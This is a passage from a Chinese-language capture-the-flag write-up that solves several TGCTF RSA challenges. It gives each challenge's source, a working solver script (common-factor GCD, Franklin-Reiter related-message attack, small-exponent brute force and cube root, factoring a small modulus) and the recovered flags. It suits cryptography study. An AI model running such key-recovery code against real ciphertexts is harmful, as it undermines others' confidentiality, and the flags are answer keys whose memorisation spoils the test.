punctuation\">)</span></code></pre>\n\n<blockquote>\n<p>TGCTF{WO0O!Y04_5R3_GOOD_AT_MOVE}</p>\n</blockquote>\n<h3 id=\"mm不躲猫猫\"><a href=\"#mm不躲猫猫\" class=\"headerlink\" title=\"mm不躲猫猫\"></a>mm不躲猫猫</h3><p>给了60组n，c，n有公共因子gcd求得解密即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ne <span class=\"token operator\">=</span> <span class=\"token number\">65537</span>\n\nn_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\nc_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n\ncurrent_n <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\ncurrent_c <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'E:\\\\wenjian\\\\p\\\\timu\\\\tgCTF\\\\cry\\\\challenge.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span>\n        line <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> line<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'['</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> line<span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span><span class=\"token string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> current_n <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span> <span class=\"token keyword\">and</span> current_c <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n                n_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>current_n<span class=\"token punctuation\">)</span>\n                c_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>current_c<span class=\"token punctuation\">)</span>\n                current_n <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n                current_c <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n        <span class=\"token keyword\">elif</span> line<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'n = '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            current_n <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'='</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> line<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'c = '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            current_c <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'='</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">if</span> current_n <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span> <span class=\"token keyword\">and</span> current_c <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n        n_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>current_n<span class=\"token punctuation\">)</span>\n        c_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>current_c<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>c_list<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    n<span class=\"token operator\">=</span>n_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>\n    other<span class=\"token operator\">=</span>n_list<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> n_list<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\n    p<span class=\"token operator\">=</span><span class=\"token boolean\">None</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> other<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> GCD<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n            p<span class=\"token operator\">=</span>GCD<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">)</span>\n            q<span class=\"token operator\">=</span>n<span class=\"token operator\">//</span>p\n            <span class=\"token keyword\">break</span>\n    <span class=\"token keyword\">if</span> p <span class=\"token operator\">==</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">continue</span>\n\n    d<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<blockquote>\n<p>TGCTF{ExcePt10n4lY0u_Fl4gF0rY0u_555b0nus}</p>\n</blockquote>\n<h3 id=\"RwSiAns\"><a href=\"#RwSiAns\" class=\"headerlink\" title=\"RwSiAns\"></a>RwSiAns</h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> FLAG\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> getPrime<span class=\"token punctuation\">,</span> bytes_to_long\n<span class=\"token keyword\">import</span> hashlib\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">generate_key</span><span class=\"token punctuation\">(</span>bits<span class=\"token operator\">=</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span>\n    q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> p <span class=\"token operator\">*</span> q<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">hash</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    x1<span class=\"token punctuation\">,</span> x2 <span class=\"token operator\">=</span> <span class=\"token number\">307</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span>\n    c1 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m <span class=\"token operator\">+</span> <span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span>x1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n    c2 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m <span class=\"token operator\">+</span> <span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span>x2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> c1<span class=\"token punctuation\">,</span> c2\n\nm <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>FLAG<span class=\"token punctuation\">)</span>\nn<span class=\"token punctuation\">,</span> e <span class=\"token operator\">=</span> generate_key<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nc1<span class=\"token punctuation\">,</span> c2 <span class=\"token operator\">=</span> encrypt<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"n = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"e = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>e<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"c1 = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c1<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"c2 = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c2<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n\nn <span class=\"token operator\">=</span> <span class=\"token number\">100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839</span>\ne <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nc1 <span class=\"token operator\">=</span> <span class=\"token number\">41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366</span>\nc2 <span class=\"token operator\">=</span> <span class=\"token number\">41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814</span></code></pre>\n\n<p>基础的相关信息攻击</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">import</span> hashlib\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">generate_key</span><span class=\"token punctuation\">(</span>bits<span class=\"token operator\">=</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span>\n    q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> p <span class=\"token operator\">*</span> q<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">hash</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    x1<span class=\"token punctuation\">,</span> x2 <span class=\"token operator\">=</span> <span class=\"token number\">307</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span>\n    c1 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m <span class=\"token operator\">+</span> <span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span>x1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n    c2 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m <span class=\"token operator\">+</span> <span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span>x2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> c1<span class=\"token punctuation\">,</span> c2\n\n\nn <span class=\"token operator\">=</span> <span class=\"token number\">100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839</span>\ne <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nc1 <span class=\"token operator\">=</span> <span class=\"token number\">41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366</span>\nc2 <span class=\"token operator\">=</span> <span class=\"token number\">41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814</span>\ns1<span class=\"token operator\">=</span><span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span><span class=\"token number\">307</span><span class=\"token punctuation\">)</span>\ns2<span class=\"token operator\">=</span><span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">franklinReiter</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>c1<span class=\"token punctuation\">,</span>c2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    g1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span>s1<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span>e <span class=\"token operator\">-</span> c1\n    g2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span>s2<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span>e <span class=\"token operator\">-</span> c2\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">gcd</span><span class=\"token punctuation\">(</span>g1<span class=\"token punctuation\">,</span> g2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">while</span> g2<span class=\"token punctuation\">:</span>\n            g1<span class=\"token punctuation\">,</span> g2 <span class=\"token operator\">=</span> g2<span class=\"token punctuation\">,</span> g1 <span class=\"token operator\">%</span> g2\n        <span class=\"token keyword\">return</span> g1<span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span>gcd<span class=\"token punctuation\">(</span>g1<span class=\"token punctuation\">,</span> g2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n\nm<span class=\"token operator\">=</span>franklinReiter<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>c1<span class=\"token punctuation\">,</span>c2<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<blockquote>\n<p>TGCTF{RS4_Tw1nZ_d0You_th1nk_ItS_fun_2win?!!!1111111111}</p>\n</blockquote>\n<h3 id=\"宝宝rsa\"><a href=\"#宝宝rsa\" class=\"headerlink\" title=\"宝宝rsa\"></a>宝宝rsa</h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> math <span class=\"token keyword\">import</span> gcd\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag\n\n<span class=\"token comment\"># PART1</span>\np1 <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span>\nq1 <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span>\nn1 <span class=\"token operator\">=</span> p1 <span class=\"token operator\">*</span> q1\nphi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p1 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>q1 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nm1 <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\ne1 <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">while</span> gcd<span class=\"token punctuation\">(</span>e1<span class=\"token punctuation\">,</span> phi<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n    e1 <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">17</span><span class=\"token punctuation\">)</span>\nc1 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">,</span> e1<span class=\"token punctuation\">,</span> n1<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p1 =\"</span><span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"q1 =\"</span><span class=\"token punctuation\">,</span> q1<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c1 =\"</span><span class=\"token punctuation\">,</span> c1<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># PART2</span>\nn2 <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span>\ne2 <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nm2 <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nc2 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m2<span class=\"token punctuation\">,</span> e2<span class=\"token punctuation\">,</span> n2<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n2 =\"</span><span class=\"token punctuation\">,</span> n2<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c2 =\"</span><span class=\"token punctuation\">,</span> c2<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"e2 =\"</span><span class=\"token punctuation\">,</span> e2<span class=\"token punctuation\">)</span></code></pre>\n\n<p>flag分两段，前一段未知e，但是比较小，直接爆破就行，第二段e&#x3D;3，n为1024位，m应该比较小直接开方即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> tqdm\n\nphi1<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p1<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q1<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> tqdm<span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">18</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> gcd<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> phi1<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">continue</span>\n    d<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>phi1<span class=\"token punctuation\">)</span>\n    m1<span class=\"token operator\">=</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>p1<span class=\"token operator\">*</span>q1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token string\">b'TGCTF'</span> <span class=\"token keyword\">in</span> m1<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">break</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># ---------------------------------------------------</span>\n<span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nm2<span class=\"token operator\">=</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>gmpy2<span class=\"token punctuation\">.</span>iroot<span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m2<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m1<span class=\"token operator\">+</span>m2<span class=\"token punctuation\">)</span></code></pre>\n\n<blockquote>\n<p>TGCTF{!!3xP_Is_Sm@ll_But_D@ng3r0}</p>\n</blockquote>\n<h3 id=\"费克特尔\"><a href=\"#费克特尔\" class=\"headerlink\" title=\"费克特尔\"></a>费克特尔</h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\">c<span class=\"token operator\">=</span><span class=\"token number\">670610235999012099846283721569059674725712804950807955010725968103642359765806</span>\nn<span class=\"token operator\">=</span><span class=\"token number\">810544624661213367964996895060815354972889892659483948276203088055391907479553</span>\ne<span class=\"token operator\">=</span><span class=\"token number\">65537</span></code></pre>\n\n<p>n很小直接yafu分一下,有很多因子,正常解即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nc<span class=\"token operator\">=</span><span class=\"token number\">670610235999012099846283721569059674725712804950807955010725968103642359765806</span>\nn<span class=\"token operator\">=</span><span class=\"token number\">810544624661213367964996895060815354972889892659483948276203088055391907479553</span>\ne<span class=\"token operator\">=</span><span class=\"token number\">65537</span>\n\np<span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">916848439436544911290378588839845528581</span><span class=\"token punctuation\">,</span><span class=\"token number\">214168842768662180574654641</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2001511</span><span class=\"token punctuation\">,</span><span class=\"token number\">18251</span> <span class=\"token punctuation\">,</span><span class=\"token number\">113</span> <span class=\"token punctuation\">]</span>\nphi<span class=\"token operator\">=</span><span class=\"token number\">1</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">:</span>\n    phi<span class=\"token operator\">*=</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\nd<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<blockquote>\n<p>TGCTF{f4888_6abdc_9c2bd_9036bb}</p>\n</blockquote>\n<h3 id=\"EZRSA\"><a href=\"#EZRSA\" class=\"headerlink\" title=\"EZRSA\"></a>EZRSA</h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span 